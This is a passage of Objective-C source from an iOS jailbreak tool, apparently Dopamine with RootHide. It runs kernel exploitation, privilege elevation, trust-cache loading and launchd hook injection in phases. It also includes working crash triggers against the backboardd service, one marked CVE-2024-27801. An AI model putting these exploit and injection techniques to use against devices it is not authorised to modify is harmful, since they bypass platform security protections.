        if (appId) {
            if (![dopamineInstalledAppIds containsObject:appId]) {
                [dopamineInstalledAppIds addObject:appId];
            }
            else {
                return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedDuplicateApps userInfo:@{ NSLocalizedDescriptionKey : [NSString stringWithFormat:DOLocalizedString(@"Duplicate_Apps_Error_Dopamine_App"), appId, dopamineAppsPath]}];
            }
        }
    }
    
    for (NSString *appUUID in [[NSFileManager defaultManager] contentsOfDirectoryAtPath:userAppsPath error:nil]) {
        NSString *UUIDPath = [userAppsPath stringByAppendingPathComponent:appUUID];
        for (NSString *appCandidate in [[NSFileManager defaultManager] contentsOfDirectoryAtPath:UUIDPath error:nil]) {
            if ([appCandidate.pathExtension isEqualToString:@"app"]) {
                NSString *appPath = [UUIDPath stringByAppendingPathComponent:appCandidate];
                NSString *infoPlistPath = [appPath stringByAppendingPathComponent:@"Info.plist"];
                NSDictionary *infoDictionary = [NSDictionary dictionaryWithContentsOfFile:infoPlistPath];
                NSString *appId = infoDictionary[@"CFBundleIdentifier"];
                if (appId) {
                    [userInstalledAppIds addObject:appId];
                }
            }
        }
    }
    
    NSMutableSet *duplicateApps = dopamineInstalledAppIds.mutableCopy;
    [duplicateApps intersectSet:userInstalledAppIds];
    if (duplicateApps.count) {
        NSMutableString *duplicateAppsString = [NSMutableString new];
        [duplicateAppsString appendString:@"["];
        BOOL isFirst = YES;
        for (NSString *duplicateApp in duplicateApps) {
            if (isFirst) isFirst = NO;
            else [duplicateAppsString appendString:@", "];
            [duplicateAppsString appendString:duplicateApp];
        }
        [duplicateAppsString appendString:@"]"];
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedDuplicateApps userInfo:@{ NSLocalizedDescriptionKey : [NSString stringWithFormat:DOLocalizedString(@"Duplicate_Apps_Error_User_App"), duplicateAppsString, dopamineAppsPath]}];
    }
    
    for (NSString *dopamineAppId in dopamineInstalledAppIds) {
        LSApplicationProxy *appProxy = [LSApplicationProxy applicationProxyForIdentifier:dopamineAppId];
        if (appProxy.installed) {
            NSString *appProxyPath = [[appProxy.bundleURL.path stringByResolvingSymlinksInPath] stringByStandardizingPath];
            if (![appProxyPath hasPrefix:dopamineAppsPath]) {
                return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedDuplicateApps userInfo:@{ NSLocalizedDescriptionKey : [NSString stringWithFormat:DOLocalizedString(@"Duplicate_Apps_Error_Icon_Cache"), dopamineAppId, dopamineAppsPath, appProxy.bundleURL.path]}];
            }
        }
    }
    
    return nil;
}

- (NSError *)finalizeBootstrapIfNeeded
{
    return [[DOEnvironmentManager sharedManager] finalizeBootstrap];
}

- (NSError *)cleanUpPostExploitation
{
    if (@available(iOS 17.0, *)) {
        uint64_t proc = proc_self();
        uint64_t ucred = proc_ucred(proc);

        // Get uid 0
        kwrite32(ucred + koffsetof(ucred, svuid), 501);
        kwrite32(ucred + koffsetof(ucred, ruid), 501);
        kwrite32(ucred + koffsetof(ucred, uid), 501);
        
        // Get gid 0
        kwrite32(ucred + koffsetof(ucred, rgid), 501);
        kwrite32(ucred + koffsetof(ucred, svgid), 501);
        kwrite32(ucred + koffsetof(ucred, groups), 501);
    }

    return nil;
}

- (void)runWithError:(NSError **)errOut didRemoveJailbreak:(BOOL*)didRemove showLogs:(BOOL *)showLogs
{
    // Do not let the early rootless spawn path attempt to patch children
    // before launchdhook has installed RootHide's runtime.
    exec_set_patch(false);

    BOOL removeJailbreakEnabled = [[DOPreferenceManager sharedManager] boolPreferenceValueForKey:@"removeJailbreakEnabled" fallback:NO];
    BOOL tweaksEnabled = [[DOPreferenceManager sharedManager] boolPreferenceValueForKey:@"tweakInjectionEnabled" fallback:YES];
    BOOL idownloadEnabled = [[DOPreferenceManager sharedManager] boolPreferenceValueForKey:@"idownloadEnabled" fallback:NO];
    BOOL appJITEnabled = [[DOPreferenceManager sharedManager] boolPreferenceValueForKey:@"appJITEnabled" fallback:YES];
    NSNumber *jetsamMultiplierOption = [[DOPreferenceManager sharedManager] preferenceValueForKey:@"jetsamMultiplier"];
    
    struct utsname systemInfo;
    uname(&systemInfo);
    NSString *startLog = [NSString stringWithFormat:@"Starting Jailbreak (Model: %s, %@, Configuration: {removeJailbreak=%d, tweakInjection=%d, idownload=%d, appJIT=%d})", systemInfo.machine, NSProcessInfo.processInfo.operatingSystemVersionString, removeJailbreakEnabled, tweaksEnabled, idownloadEnabled, appJITEnabled];
    [[DOUIManager sharedInstance] sendLog:startLog debug:YES];

    *errOut = [self beginRootHideLaunchdTrace];
    if (*errOut) return;
    RootHideAppendTrace(@"phase: gathering system information");
    *errOut = [self gatherSystemInformation];
    if (*errOut) {
        RootHideAppendTrace([NSString stringWithFormat:@"FAILURE: gathering system information: %@", (*errOut).localizedDescription]);
        return;
    }
    RootHideAppendTrace(@"phase complete: gathering system information");

    RootHideAppendTrace(@"phase: acquiring kernel exploit");
    *errOut = [self doExploitation];
    if (*errOut) {
        RootHideAppendTrace([NSString stringWithFormat:@"FAILURE: acquiring kernel exploit: %@", (*errOut).localizedDescription]);
        // We don't care about the return value of cleanup at this point, we just need to prevent a panic on exit
        [self cleanUpExploits];
        return;
    }
    RootHideAppendTrace(@"phase complete: acquiring kernel exploit");
    
    gSystemInfo.jailbreakSettings.markAppsAsDebugged = appJITEnabled;
    gSystemInfo.jailbreakSettings.jetsamMultiplier = jetsamMultiplierOption ? (jetsamMultiplierOption.doubleValue / 2) : 0;
    gSystemInfo.jailbreakInfo.dyld_patch_enabled = [[DOPreferenceManager sharedManager] boolPreferenceValueForKey:@"dyldPatchEnabled" fallback:NO];
    
    [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Building Phys R/W Primitive") debug:NO];
    RootHideAppendTrace(@"phase: building physical read/write primitive");
    *errOut = [self buildPhysRWPrimitive];
    if (*errOut) {
        RootHideAppendTrace([NSString stringWithFormat:@"FAILURE: building physical read/write primitive: %@", (*errOut).localizedDescription]);
        [self cleanUpExploits];
        return;
    }
    RootHideAppendTrace(@"phase complete: building physical read/write primitive");
    [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Cleaning Up Exploits") debug:NO];
    RootHideAppendTrace(@"phase: cleaning up exploit resources");
    *errOut = [self cleanUpExploits];
    if (*errOut) {
        RootHideAppendTrace([NSString stringWithFormat:@"FAILURE: cleaning up exploit resources: %@", (*errOut).localizedDescription]);
        return;
    }
    RootHideAppendTrace(@"phase complete: cleaning up exploit resources");
    
    // We will not be able to reset this after elevating privileges, so do it now
    if (removeJailbreakEnabled) [[DOPreferenceManager sharedManager] setPreferenceValue:@NO forKey:@"removeJailbreakEnabled"];

    [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Elevating Privileges") debug:NO];
    RootHideAppendTrace(@"phase: elevating privileges");
    *errOut = [self elevatePrivileges];
    if (*errOut) {
        RootHideAppendTrace([NSString stringWithFormat:@"FAILURE: elevating privileges: %@", (*errOut).localizedDescription]);
        return;
    }
    RootHideAppendTrace(@"phase complete: elevating privileges");

    RootHideAppendTrace(@"phase: making system apps visible");
    *errOut = [self showNonDefaultSystemApps];
    if (*errOut) {
        RootHideAppendTrace([NSString stringWithFormat:@"FAILURE: making system apps visible: %@", (*errOut).localizedDescription]);
        [self cleanUpPostExploitation];
        return;
    }
    RootHideAppendTrace(@"phase complete: making system apps visible");

    RootHideAppendTrace(@"phase: validating Developer Mode");
    *errOut = [self ensureDevModeEnabled];
    if (*errOut) {
        RootHideAppendTrace([NSString stringWithFormat:@"FAILURE: validating Developer Mode: %@", (*errOut).localizedDescription]);
        [self cleanUpPostExploitation];
        return;
    }
    RootHideAppendTrace(@"phase complete: validating Developer Mode");

    // Now that we are unsandboxed, populate the jailbreak root path
    RootHideAppendTrace(@"phase: ensuring jailbreak root");
    *errOut = [[DOEnvironmentManager sharedManager] ensureJailbreakRootExists];
    if (*errOut) {
        RootHideAppendTrace([NSString stringWithFormat:@"FAILURE: ensuring jailbreak root: %@", (*errOut).localizedDescription]);
        [self cleanUpPostExploitation];
        return;
    }
    RootHideAppendTrace(@"phase complete: ensuring jailbreak root");
    
    if (removeJailbreakEnabled) {
        [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Removing Jailbreak") debug:NO];
        *errOut = [[DOEnvironmentManager sharedManager] deleteBootstrap];
        *didRemove = YES;
        [self cleanUpPostExploitation];
        return;
    }
    
    RootHideAppendTrace(@"phase: preparing RootHide bootstrap");
    *errOut = [[DOEnvironmentManager sharedManager] prepareBootstrap];
    if (*errOut) {
        RootHideAppendTrace([NSString stringWithFormat:@"FAILURE: preparing RootHide bootstrap: %@", (*errOut).localizedDescription]);
        return;
    }
    RootHideAppendTrace(@"phase complete: preparing RootHide bootstrap");

    [[DOUIManager sharedInstance] sendLog:@"Preparing persistent RootHide diagnostic trace" debug:NO];
    *errOut = [self configureRootHideLaunchdTrace];
    if (*errOut) {
        [self cleanUpPostExploitation];
        return;
    }
    RootHideAppendTrace(@"phase complete: RootHide bootstrap preparation");

    setenv("PATH", "/sbin:/bin:/usr/sbin:/usr/bin:/rootfs/sbin:/rootfs/bin:/rootfs/usr/sbin:/rootfs/usr/bin", 1);
    setenv("TERM", "xterm-256color", 1);

    RootHideAppendTrace(@"phase: updating boot logo");
    *errOut = [[DOEnvironmentManager sharedManager] updateBootLogo];
    if (*errOut) {
        RootHideAppendTrace(@"FAILURE: boot logo update failed");
        [self cleanUpPostExploitation];
        return;
    }
    RootHideAppendTrace(@"phase complete: boot logo update");
    
    if (!tweaksEnabled) {
        printf("Creating safe mode marker file since tweaks were disabled in settings\n");
        [[NSData data] writeToFile:JBROOT_PATH(@"/basebin/.safe_mode") atomically:YES];
    }
    
    [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Loading BaseBin TrustCache") debug:NO];
    *errOut = [self loadBasebinTrustcache];
    if (*errOut) {
        [self cleanUpPostExploitation];
        return;
    }

    // Build and trust the merged dyld before modifying PID 1.  MachOMerger
    // does not need launchd child patching (BaseBin is already trust-cached),
    // and keeping this Swift helper outside the live launchdhook window avoids
    // turning a merger stall into an ambiguous launchd/userspace restart.
    [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Initializing RootHide") debug:NO];
    RootHideAppendTrace(@"phase: generating RootHide dyld environment");
    int rootHideResult = basebin_generate(false);
    if (rootHideResult != 0) {
        RootHideAppendTrace([NSString stringWithFormat:@"FAILURE: generating RootHide dyld environment returned %d", rootHideResult]);
        *errOut = [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedInitFakeLib userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Creating RootHide dyld environment failed: %d", rootHideResult]}];
        [self cleanUpPostExploitation];
        return;
    }
    RootHideAppendTrace(@"phase complete: generating RootHide dyld environment");

    RootHideAppendTrace(@"phase: uploading RootHide dyld trust cache");
    rootHideResult = ensure_dyld_trustcache(JBROOT_PATH("/basebin/.fakelib/dyld"));
    if (rootHideResult != 0) {
        RootHideAppendTrace([NSString stringWithFormat:@"FAILURE: uploading RootHide dyld trust cache returned %d", rootHideResult]);
        *errOut = [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedInitFakeLib userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Uploading dyld trustcache failed: %d", rootHideResult]}];
        [self cleanUpPostExploitation];
        return;
    }
    RootHideAppendTrace(@"phase complete: uploading RootHide dyld trust cache");

    [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Initializing Environment") debug:NO];
    *errOut = [self injectLaunchdHook];
    if (*errOut) {
        [self cleanUpPostExploitation];
        return;
    }

    // launchdhook is now live; enable child patching and use the stock path
    // while the first userspace reboot is being prepared.
    exec_set_patch(true);
    setenv("DYLD_IN_CACHE", "0", 1);
    setenv("DISABLE_TWEAKS", "1", 1);
    setenv("DYLD_INSERT_LIBRARIES", JBROOT_PATH("/basebin/systemhook.dylib"), 1);
    RootHideAppendTrace(@"phase complete: enabled RootHide child patching");
    
    // iconservicesagent is restarted by the imminent userspace reboot.  Running
    // killall here would spawn the first child after RootHide patching is enabled,
    // which can block before the RootHide bootstrap finalizer is reached.
    RootHideAppendTrace(@"phase complete: deferred iconservicesagent restart until userspace reboot");

    // launchdhook deliberately postpones jailbreakd while its constructor is
    // running inside opainject.  The constructor has returned now, so request
    // the deferred service and wait for its check-in before Bootstrap starts.
    // Bootstrap children can then use the normal patch path instead of merely
    // trusting the outer /bin/sh process.
    RootHideAppendTrace(@"phase: starting deferred jailbreakd for Bootstrap child patching");
    if (!RootHideWaitForDeferredJailbreakd()) {
        RootHideAppendTrace(@"FAILURE: deferred jailbreakd did not become ready within 10 seconds");
        *errOut = [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLaunchdInjection userInfo:@{NSLocalizedDescriptionKey : @"RootHide jailbreakd did not become ready for Bootstrap"}];
        [self cleanUpPostExploitation];
        return;
    }
    RootHideAppendTrace(@"phase complete: deferred jailbreakd ready for Bootstrap child patching");
    
    RootHideAppendTrace(@"phase: finalizing RootHide bootstrap");
    // SpringBoard cannot show the terminal-password prompt during the first
    // Bootstrap.  Avoid the prep script retrying a killed uialert forever.
    setenv("NO_PASSWORD_PROMPT", "1", 1);
    // systemhook normally trusts only the immediate executable.  During the
    // first Bootstrap, trust each launched executable together with its Mach-O
    // dependencies because the package tree has not gone through a normal
    // post-reboot launch yet.
    setenv("ROOTHIDE_BOOTSTRAP_RECURSIVE_TRUST", "1", 1);
    unsetenv("ROOTHIDE_BOOTSTRAP_TRUST_ONLY");
    exec_set_bootstrap_trust_only(false);
    *errOut = [self finalizeBootstrapIfNeeded];
    unsetenv("ROOTHIDE_BOOTSTRAP_RECURSIVE_TRUST");
    unsetenv("NO_PASSWORD_PROMPT");
    if (*errOut) {
        RootHideAppendTrace([NSString stringWithFormat:@"FAILURE: finalizing RootHide bootstrap: %@", (*errOut).localizedDescription]);
        [self cleanUpPostExploitation];
        return;
    }
    RootHideAppendTrace(@"phase complete: finalizing RootHide bootstrap");
    
    [[DOEnvironmentManager sharedManager] setIDownloadEnabled:idownloadEnabled needsUnsandbox:NO];
    RootHideAppendTrace(@"phase complete: configured RootHide services");
    
    // RootHide's randomized jbroot is intentionally outside the rootless
    // app path, so the rootless duplicate-app check is not applicable here.
    RootHideAppendTrace(@"phase: final jailbreak cleanup");
    *errOut = [self cleanUpPostExploitation];
    if (*errOut) {
        RootHideAppendTrace([NSString stringWithFormat:@"FAILURE: final jailbreak cleanup: %@", (*errOut).localizedDescription]);
        return;
    }

    // DOEnvironmentManager caches the launch-time jailbreak state with
    // dispatch_once.  This process started unjailbroken, so refresh that cache
    // only after every setup step has succeeded.  finalize can then borrow root
    // and actually spawn jbctl after cleanUpPostExploitation drops us to mobile.
    DOEnvironmentManager *environmentManager = [DOEnvironmentManager sharedManager];
    [environmentManager setJailbroken:YES withVersion:environmentManager.appVersion];
    RootHideAppendTrace(@"phase complete: refreshed in-process jailbreak state");
    RootHideAppendTrace(@"phase complete: jailbreak setup; userspace reboot requested next");


    //printf("Starting launch daemons...\n");
    //exec_cmd_trusted(JBROOT_PATH("/usr/bin/uicache"), "-a", NULL);
    //exec_cmd_trusted(JBROOT_PATH("/usr/bin/launchctl"), "bootstrap", "system", JBROOT_PATH("/Library/LaunchDaemons"), NULL);
    //exec_cmd_trusted(JBROOT_PATH("/usr/bin/launchctl"), "bootstrap", "system", JBROOT_PATH("/basebin/LaunchDaemons"), NULL);
    // Note: This causes the app to freeze in some instances due to launchd only having physrw_pte, we might want to only do it when neccessary
    // It's only neccessary when we don't immediately userspace reboot
    
    printf("Done!\n");
}

- (void)finalize
{
    [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Rebooting Userspace") debug:NO];
    RootHideAppendTrace(@"phase: invoking userspace reboot");
    NSString *tracePath = RootHideLaunchdTracePath();
    setenv("ROOTHIDE_JBCTL_TRACE_PATH", tracePath.fileSystemRepresentation, 1);
    RootHideAppendTrace(@"phase complete: configured jbctl userspace-reboot trace channel");
    int rebootResult = [[DOEnvironmentManager sharedManager] rebootUserspace];
    unsetenv("ROOTHIDE_JBCTL_TRACE_PATH");
    if (rebootResult != 0) {
        DOEnvironmentManager *environmentManager = [DOEnvironmentManager sharedManager];
        [environmentManager setJailbroken:NO withVersion:environmentManager.appVersion];
        RootHideAppendTrace([NSString stringWithFormat:@"FAILURE: userspace reboot command returned %d", rebootResult]);
    }
    else {
        RootHideAppendTrace(@"phase complete: userspace reboot command accepted");
    }
}

- (IOSurfaceRef)allocatePurpleGfxMemWithSize:(size_t)size
{
    NSDictionary *surfaceProperties = @{
        @"IOSurfaceMemoryRegion" : @"PurpleGfxMem",
        @"IOSurfaceAllocSize" : @(size),
    };
    return IOSurfaceCreate((__bridge CFDictionaryRef)surfaceProperties);
}

- (BOOL)surfaceIsContiguous:(IOSurfaceRef)surface
{
    vm_address_t mem_addr = (vm_address_t)IOSurfaceGetBaseAddress(surface);
    vm_size_t mem_size = (vm_size_t)IOSurfaceGetAllocSize(surface);
    vm_region_submap_short_info_data_64_t info = {0};
    uint32_t count = VM_REGION_SUBMAP_SHORT_INFO_COUNT_64;
    natural_t depth = 9999999;
    
    kern_return_t kr = vm_region_recurse_64(mach_task_self(), &mem_addr, &mem_size, &depth, (vm_region_recurse_info_t)&info, &count);
    return (kr == 0 && info.share_mode == SM_EMPTY && info.object_id != 0);
}

- (BOOL)contiguousMappingWorks
{
    IOSurfaceRef surface = [self allocatePurpleGfxMemWithSize:0x8000];
    if (surface == NULL) return false;
    
    BOOL contiguous = [self surfaceIsContiguous:surface];
    CFRelease(surface);
    return contiguous;
}

- (BOOL)contiguousMappingWorkaroundNeeded
{
    DOExploit *kernelExploit = [DOExploitManager sharedManager].selectedKernelExploit;
    if ([kernelExploit hasRequirement:@"contiguousMapping"]) {
        return ![self contiguousMappingWorks];
    }
    return NO;
}

- (int)crashBackboardd
{
#pragma pack(push, 4)
    typedef struct {
        mach_msg_header_t header;
        mach_msg_body_t body;
        mach_msg_ool_descriptor_t archive;
        NDR_record_t ndr;
        mach_msg_type_number_t archiveLength;
    } Request;
#pragma pack(pop)
    
    kern_return_t bootstrap_look_up(mach_port_t, const char *, mach_port_t *);
    
    NSData *archive =
        [NSKeyedArchiver archivedDataWithRootObject:@[ @[] ]
                              requiringSecureCoding:YES
                                              error:nil];
    mach_port_t bootstrap = MACH_PORT_NULL;
    mach_port_t service = MACH_PORT_NULL;

    if (!archive ||
        task_get_bootstrap_port(mach_task_self(), &bootstrap) != KERN_SUCCESS ||
        bootstrap_look_up(bootstrap, "com.apple.backboard.hid.services", &service) != KERN_SUCCESS) {
        return -1;
    }

    Request request = {0};
    request.header.msgh_bits =
        MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
    request.header.msgh_size = sizeof(request);
    request.header.msgh_remote_port = service;
    request.header.msgh_id = 6000032;   // kPostTouchAnnotationsMessageID
    request.body.msgh_descriptor_count = 1;
    request.archive.address = (void *)archive.bytes;
    request.archive.size = (mach_msg_size_t)archive.length;
    request.archive.copy = MACH_MSG_VIRTUAL_COPY;
    request.archive.type = MACH_MSG_OOL_DESCRIPTOR;
    request.ndr = NDR_record;
    request.archiveLength = (mach_msg_type_number_t)archive.length;

    (void)mach_msg(&request.header,
                   MACH_SEND_MSG | MACH_SEND_TIMEOUT,
                   request.header.msgh_size,
                   0,
                   MACH_PORT_NULL,
                   1000,
                   MACH_PORT_NULL);
    
    mach_port_deallocate(mach_task_self(), service);
    return 0;
}

- (int)crashBackboardd_15
{
    // CVE-2024-27801
    xpc_connection_t (*haxx_xpc_connection_create_mach_service)(const char *, dispatch_queue_t, uint64_t) = dlsym(RTLD_DEFAULT, "xpc_connection_create_mach_service");
    if (!haxx_xpc_connection_create_mach_service) {
        return -1;
    }
    xpc_connection_t client = haxx_xpc_connection_create_mach_service("com.apple.backboard.TouchDeliveryPolicyServer", NULL, 0);
    xpc_connection_set_event_handler(client, ^(xpc_object_t event) {});
    xpc_connection_resume(client);
    xpc_object_t message = xpc_dictionary_create(NULL, NULL, 0);
    uint8_t root[1024] = { 0 };
    memcpy(root, "bplist17", strlen("bplist17"));
    xpc_dictionary_set_data(message, "root",root, 1024);
    xpc_dictionary_set_uint64(message, "proxynum", 1);
    xpc_dictionary_set_uint64(message, "inv", 1);
    uint8_t uaf_xpc[1024];
    memset(uaf_xpc, 0x41, 1024);
    xpc_dictionary_set_value(message, "ool", xpc_data_create(uaf_xpc, 1024));
    xpc_connection_send_message_with_reply_sync(client, message);
    return 0;
}

- (void)applyContiguousMappingWorkaround
{
    if (@available(iOS 16.0, *)) {
        [self crashBackboardd];
    }
    else {
        [self crashBackboardd_15];
    }
    // After backboardd has crashed, we have about 200ms until the new backboardd kills our app
    // In this timeframe we need to steal it's contiguous PurpleGfxMem allocation
    IOSurfaceRef surface = NULL;
    do {
        if (surface) {
            CFRelease(surface);
            surface = NULL;
            usleep(50);
        }
        surface = [self allocatePurpleGfxMemWithSize:0x8000];
    }
    while (![self surfaceIsContiguous:surface]);
    
    printf("Got contiguous mapping surface %p\n", surface);
    
    // We keep the surface alive for another 20 seconds
    // This persists our process being killed
    // Once it is freed, the next Dopamine can regain the contiguous mapping
    mach_port_t surfacePort = IOSurfaceCreateMachPort(surface);
    kern_return_t kr = clock_alarm_preserve_port(surfacePort, 20);
    mach_port_mod_refs(mach_task_self(), surfacePort, MACH_PORT_RIGHT_SEND, -1);
    CFRelease(surface);
    
    printf("preserved port? %d\n", kr);
}

@end
